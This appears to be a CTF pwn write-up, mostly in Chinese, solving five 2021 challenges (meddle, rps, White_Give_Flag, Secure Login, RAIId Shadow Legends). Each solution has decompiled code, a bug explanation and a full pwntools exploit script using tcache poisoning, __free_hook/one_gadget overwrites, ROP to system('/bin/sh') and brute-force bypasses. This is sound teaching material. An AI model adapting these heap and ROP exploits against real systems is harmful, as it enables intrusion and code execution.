# Challenges 100 Week 9


# Challenges_100-Week_9

|              Challenges               |          Tricks          |
| :-----------------------------------: | :----------------------: |
|        NahamconCTF-2021-meddle        | `UAF`+`tcache_poisoning` |
|         NahamconCTF-2021-rps          |  `stackoverflow`+`fmt`   |
|    V&NCTF2021-PWN-White_Give_Flag     |      `force bypass`      |
|     angstromctf-2021-Secure Login     |     ``force bypass``     |
| angstromctf-2021-RAIId Shadow Legends |  `覆写未初始化变量地址`  |


<!--more-->

# meddle

ps:test in local environment

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
int add_album()
{
  int v0; // eax
  __int64 v1; // rcx
  void **v2; // rax
  char *v4; // [rsp+8h] [rbp-8h]

  if ( count > 17 )
  {
    LODWORD(v2) = puts("no more albums :(");
  }
  else
  {
    v4 = (char *)malloc(0x84uLL);
    printf("enter album name: ");
    fgets(v4 + 4, 80, stdin);
    printf("enter artist name: ");
    fgets(v4 + 84, 48, stdin);
    v0 = count++;
    v1 = 8LL * v0;
    v2 = &albums;
    *(void **)((char *)&albums + v1) = v4;
  }
  return (int)v2;
}
```

**view**

```c
int view_album()
{
  __int64 v0; // rax
  int v2; // [rsp+Ch] [rbp-4h]

  printf("what album would you like to view? ");
  v2 = getnum();
  if ( v2 < 0 || v2 >= count )
  {
    LODWORD(v0) = puts("invalid index :(");
  }
  else
  {
    v0 = (__int64)*(&albums + v2);
    if ( v0 )
    {
      printf("album name: %s\n", (const char *)*(&albums + v2) + 4);
      printf("artist: %s\n", (const char *)*(&albums + v2) + 84);
      LODWORD(v0) = printf("ratings: %d\n", *(unsigned int *)*(&albums + v2));
    }
  }
  return v0;
}
```

**rate**

```c
int rate_album()
{
  __int64 v0; // rax
  _DWORD *v1; // rbx
  int v3; // [rsp+Ch] [rbp-14h]

  printf("what album would you like to rate? ");
  v3 = getnum();
  if ( v3 < 0 || v3 >= count )
  {
    LODWORD(v0) = puts("invalid index :(");
  }
  else
  {
    v0 = (__int64)*(&albums + v3);
    if ( v0 )
    {
      printf("\nwhat do you want to rate this album? ");
      v1 = *(&albums + v3);
      LODWORD(v0) = getnum();
      *v1 = v0;
    }
  }
  return v0;
}
```

**delete**

```c
void delete_album()
{
  int v0; // [rsp+Ch] [rbp-4h]

  printf("what album would you like to delete? ");
  v0 = getnum();
  if ( v0 < 0 || v0 >= count )
    puts("invalid index :(");
  else
    free(*(&albums + v0));
}
```

漏洞点为`free`时没有将指针销毁，且没用任何标志，造成了UAF。libc版本为2.27，有`tcache`但是没有`double free`检查。

首先，将`tcache`填满，再利用UAF，leak `main_arena`的地址。之后利用`tcache_poisoning`，申请到`__free_hook`，将其覆写为`onegadget`

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./meddle'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',32446)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.27.so')

def add(album, artist):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('enter album name: ')
    p.sendline(str(album))
    p.recvuntil('enter artist name: ')
    p.sendline(str(artist))
    
def view(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('what album would you like to view? ')
    p.sendline(str(index))

    
def rate(index,rate):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('what do you want to rate this album? ')
    p.sendline(str(rate))
    
    
def dele(index):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil('what album would you like to delete? ')
    p.sendline(str(index))

for i in range(7):
    add(str(i)*4,str(i)*4)

add('aaa','aaa') # 7
add('bbb','bbb') # 8

for i in range(7):
    dele(i)

dele(7)
#gdb.attach(p)
view(7)

high_bits = hex(u16(p.recvuntil('\x7f')[-2:].ljust(2,b'\x00')))
p.recvuntil('ratings: ')
low_bits = "%x" % int(p.recvuntil('\n')[:-1])
main_arena = high_bits+low_bits
main_arena = int(main_arena.replace("-", ""), 16) - 96
leak('main_arena',main_arena)

malloc_hook = main_arena - 0x10
libcbase = main_arena - 0x3ebd00
offset = 0x7f158ab6a8e8-0x7f158ab68c30
free_hook = libcbase + libc.sym['__free_hook']
leak('malloc_hook',malloc_hook)
leak('libcbase',libcbase)
leak('free_hook',free_hook)

for i in range(5):
    add(str(i)*4,str(i)*4) #9 10 11 12 13

dele(12)
dele(12)
add(p32(free_hook >> 32), "bbb")#14
rate(12, free_hook & 0xffffffff)

add('nnn','nnn')#15

one_gadget = libcbase + 0x4f322
add(p32(one_gadget >> 32), "bbb") #16
rate(16, one_gadget & 0xffffffff)

p.recvuntil('> ')
p.sendline('5')

p.interactive()
```

# rps

## checksec

```shell
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
## IDA

```c
void play()
{
  unsigned int v0; // eax
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  int v2; // [rsp+8h] [rbp-8h]
  char v3; // [rsp+Fh] [rbp-1h]

  v3 = 1;
  v0 = time(0LL);
  srand(v0);
  while ( v3 )
  {
    v2 = rand() % 3 + 1;
    sub_4012C9();
    __isoc99_scanf(off_404028, &v1);
    getchar();
    if ( v2 == v1 )
      puts("Congrats you win!!!!!");
    else
      puts("You lose!");
    putchar(10);
    printf("Would you like to play again? [yes/no]: ");
    read(0, &s2, 0x19uLL);
    if ( !strcmp("no\n", &s2) )
    {
      v3 = 0;
    }
    else if ( !strcmp("yes\n", &s2) )
    {
      v3 = 1;
    }
    else
    {
      puts("Well you didn't say yes or no..... So I'm assuming no.");
      v3 = 0;
    }
    memset(&s2, 0, 4uLL);
  }
}
```

`read(0, &s2, 0x19uLL);`覆写`off_404028`，使其变成`%s`，从而产生溢出。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=1
binary='./rps'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('220.249.52.133',32446)

elf = ELF(binary,checksec=False)
libc = ELF('./libc-2.31.so')

read_got = elf.got['read']
puts_plt = elf.plt['puts']
pop_rdi = 0x0000000000401513
one = [0xe6c7e,0xe6c81,0xe6c84]

p.sendlineafter('[y/n]: ',b'y')
p.sendlineafter('> ',b'1')
# gdb.attach(p)
payload = b'yes\n'+b'\x00'*(0x19-4-1)+b'\x08'
p.sendlineafter('[yes/no]: ',payload)

payload = b'a'*0x14+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(0x401453)
p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no\n')

read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libcbase = read_addr - libc.sym['read']
system = libcbase+libc.sym['system']
binsh=next(libc.search(b"/bin/sh"))
one_gadget = libcbase+one[1]
leak('libcbase',libcbase)
gdb.attach(p)
pop_4=0x000000000040150c
ret = 0x040101a
p.sendlineafter('[y/n]:',b'y')
payload = b'a'*0x14+p64(one_gadget)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no\n')

p.interactive()
```

# White_Give_Flag

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
  v0 = time(0LL);
  srand(v0);
  qword_202120[0] = (__int64)aThereIsNoVulnI;
  qword_202128 = (__int64)aThereIsNoVulnI_0;
  qword_202130 = (__int64)aThereIsNoVulnI_1;
  qword_202138 = (__int64)aThereIsNoVulnI_2;
  qword_202140 = (__int64)aBye;
  s = (char *)malloc(0x200uLL);
  for ( i = 0LL; i < random() % 11 + 5; ++i )
  {
    memset(s, 0, 0x100uLL);
    free(s);
    v1 = random();
    s = (char *)malloc(v1 % 0x201 + 0x300);
    open("./flag", 0);
    read(3, s + 16, 0x26uLL);
    close(3);
  }
  free(s);
```

**main**

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+Ch] [rbp-4h]

  sub_B1A(a1, a2, a3);
  while ( 1 )
  {
    menu();
    v3 = choice();
    puts((const char *)qword_202120[v3 - 1]);
    switch ( v3 )
    {
      case 1:
        add();
        break;
      case 2:
        show();
        break;
      case 3:
        dele();
        break;
      case 4:
        edit();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid!");
        exit(0);
    }
  }
}
```

是个不同寻常的堆题，再进入菜单前，申请了随机size为`0x300-0x500`的chunk，并将flag，放到了偏移+0x10的位置。

`v3 = choice();`返回的是读取的字节数，`puts((const char *)qword_202120[v3 - 1]);`这里根据选项将一段字符进行了输出。

`qword_202120`附近是chunk数组的地址，它前面就是chunk[3]。

利用思路是，先随机申请三个小chunk，最后申请一个较大的chunk，这些chunk都是从包含flag的那个chunk中分割出来的，将前面的`\x00`使用`edit`进行填补。之后通过截断输入流使`v3=0`，这样puts就会输出chunk中的内容。进行爆破，若最后申请的chunk正好到flag的位置。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{:#x}'.format(name,hex(addr)))
# context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./White_Give_Flag'
#gdb.attach(p)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('node4.buuoj.cn', 39123)

elf = ELF(binary,checksec=False)

def add(size):
    sh.sendlineafter('choice:','')
    sh.sendlineafter('size:',str(size))
    
def show():
	sh.sendlineafter('choice:','2')
 
def dele(index):
    sh.sendlineafter('choice:','33')
    sh.sendlineafter('index:',str(index))
    
def edit(index,content):
    sh.sendlineafter('choice:','444')
    sh.sendlineafter('index:',str(index))
    sh.sendlineafter('Content:',str(content))
    
def exit():
    sh.sendlineafter('choice:','5555')

while True:
	sh=remote('node4.buuoj.cn', 39123)
	add(0x10)
	add(0x10)
	add(0x10)
	add(0x310)
	edit(3,'+'*0x10)
	# sh.recvuntil('choice:')
	sh.shutdown_raw('send')
	flag = sh.recv()
	log.info(flag)
	if 'vnctf{' in flag or '}' in flag:
	 	exit(0)
	sh.close()
	sleep(1)
```

# Secure Login

```c
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```

这里通过`/dev/urandom`生成的随机密码，`strcmp`在比较的的两个字符串，所以传入的数据都当作字符串进行处理，当遇到'\x00'和'\n'的时候，比较就结束了。

通过`/dev/urandom`生成的字符串也是有一定的几率生成开头就'\x00'截断的字符的，所以通过暴力破解就可以bypass检查。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"
context.log_level = 'error'

local=1
binary='./login'
#gdb.attach(sh)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('shell.actf.co',21820)

# elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')
#gdb.attach(sh)

for i in range(10000):
    sh=process(binary)
    sh.sendline('\x00')
    sh.recvuntil(': ')
    buf = sh.recv()
    if (not 'Wrong!' in buf):
        print(buf)
    sh.close()
```

# RAIId Shadow Legends

```c
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

ifstream flag("flag.txt");

struct character {
	int health;
	int skill;
	long tokens;
	string name;
};

void play() {
	string action;
	character player;
	cout << "Enter your name: " << flush;
	getline(cin, player.name);
	cout << "Welcome, " << player.name << ". Skill level: " << player.skill << endl;
	while (true) {
		cout << "\n1. Power up" << endl;
		cout << "2. Fight for the flag" << endl;
		cout << "3. Exit game\n" << endl;
		cout << "What would you like to do? " << flush;
		cin >> action;
		cin.ignore();
		if (action == "1") {
			cout << "Power up requires shadow tokens, available via in app purchase." << endl;
		} else if (action == "2") {
			if (player.skill < 1337) {
				cout << "You flail your arms wildly, but it is no match for the flag guardian. Raid failed." << endl;
			} else if (player.skill > 1337) {
				cout << "The flag guardian quickly succumbs to your overwhelming power. But the flag was destroyed in the frenzy!" << endl;
			} else {
				cout << "It's a tough battle, but you emerge victorious. The flag has been recovered successfully: " << flag.rdbuf() << endl;
			}
		} else if (action == "3") {
			return;
		}
	}
}

void terms_and_conditions() {
	string agreement;
	string signature;
	cout << "\nRAIId Shadow Legends is owned and operated by Working Group 21, Inc. ";
	cout << "As a subsidiary of the International Organization for Standardization, ";
	cout << "we reserve the right to standardize and/or destandardize any gameplay ";
	cout << "elements that are deemed fraudulent, unnecessary, beneficial to the ";
	cout << "player, or otherwise undesirable in our authoritarian society where ";
	cout << "social capital has been eradicated and money is the only source of ";
	cout << "power, legal or otherwise.\n" << endl;
	cout << "Do you agree to the terms and conditions? " << flush;
	cin >> agreement;
	cin.ignore();
	while (agreement != "yes") {
		cout << "Do you agree to the terms and conditions? " << flush;
		cin >> agreement;
		cin.ignore();
	}
	cout << "Sign here: " << flush;
	getline(cin, signature);
}

int main() {
	cout << "Welcome to RAIId Shadow Legends!" << endl;
	while (true) {
		cout << "\n1. Start game" << endl;
		cout << "2. Purchase shadow tokens\n" << endl;
		cout << "What would you like to do? " << flush;
		string action;
		cin >> action;
		cin.ignore();
		if (action == "1") {
			terms_and_conditions();
			play();
		} else if (action == "2") {
			cout << "Please mail a check to RAIId Shadow Legends Headquarters, 1337 Leet Street, 31337." << endl;
		}
	}
}
```

在生成玩家信息的时候，没有进行任何的修改操作，仅仅是输出。所以如果栈的那个位置本来就是`1337`就会满足要求。

所以在`terms_and_conditions`输入`0x539`就可能改变栈内容。

## exp

```c
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.log_level="DEBUG"
#context.arch="amd64"

local=1
binary='./raiid_shadow_legends'
#gdb.attach(sh)
if local:
	sh=process(binary)
else:
	sh=remote('shell.actf.co',21300)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')

sh.sendlineafter('What would you like to do?','1')

for i in range(10):
	sh.sendlineafter('Do you agree to the terms and conditions?',p32(0x539)*2)
	sh.sendlineafter('Do you agree to the terms and conditions?','yes')
	sh.sendlineafter('Sign here:',p32(0x539)*2)
	sh.sendlineafter('Enter your name:',p32(0x539)*2)
	sh.sendline('2')

sh.interactive()
```
